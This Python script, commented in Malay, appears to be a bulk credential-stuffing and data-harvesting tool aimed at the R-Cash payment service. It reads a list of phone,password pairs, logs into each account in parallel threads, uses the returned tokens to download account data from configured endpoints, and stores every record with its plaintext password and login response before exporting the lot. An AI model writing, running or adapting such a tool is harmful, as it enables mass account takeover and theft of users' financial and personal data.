#!/usr/bin/env python3
"""Kutip data akaun R-Cash secara pukal. Guna: python3 dump_akaun.py akaun.txt --pekerja 4"""
import argparse, json, sys
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
from lib.http import post, get
from lib.util import normal, simpan_json, baca_json, eksport, jeda, DIR
import os

CFG = json.load(open("config.json"))["rcash"]
URL = CFG["base"] + CFG["login"]


def proses(tel, pw):
    tel = normal(tel)
    nama = tel.replace("+", "") + ".json"
    if baca_json(nama):
        print(f"[LANGKAU] {tel}")
        return

    st, login = post(URL, {CFG["login_fields"][0]: tel, CFG["login_fields"][1]: pw})
    if not login.get("success"):
        print(f"[GAGAL] {tel} -> {login.get('error') or login.get('detail')}")
        return

    tok = login.get("access_token")
    rekod = {"telefon": tel, "password": pw, "login": login}
    for ep in CFG["endpoints_data"]:
        st2, j = get(CFG["base"] + ep, tok)
        rekod[ep.strip("/").replace("/", "_")] = j

    simpan_json(nama, rekod)
    print(f"[OK] {tel} -> {(login.get('customer') or {}).get('full_name', '?')}")
    jeda()


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("fail")
    ap.add_argument("--pekerja", type=int, default=4)
    a = ap.parse_args()

    baris = [b.strip() for b in open(a.fail, encoding="utf-8")
             if b.strip() and not b.startswith("#") and "," in b]
    with ThreadPoolExecutor(max_workers=a.pekerja) as ex:
        list(ex.map(lambda b: proses(*b.split(",", 1)), baris))

    semua = []
    if os.path.isdir(DIR):
        for n in sorted(os.listdir(DIR)):
            if n.endswith(".json"):
                semua.append(json.load(open(os.path.join(DIR, n), encoding="utf-8")))
    eksport(semua)


if __name__ == "__main__":
    main()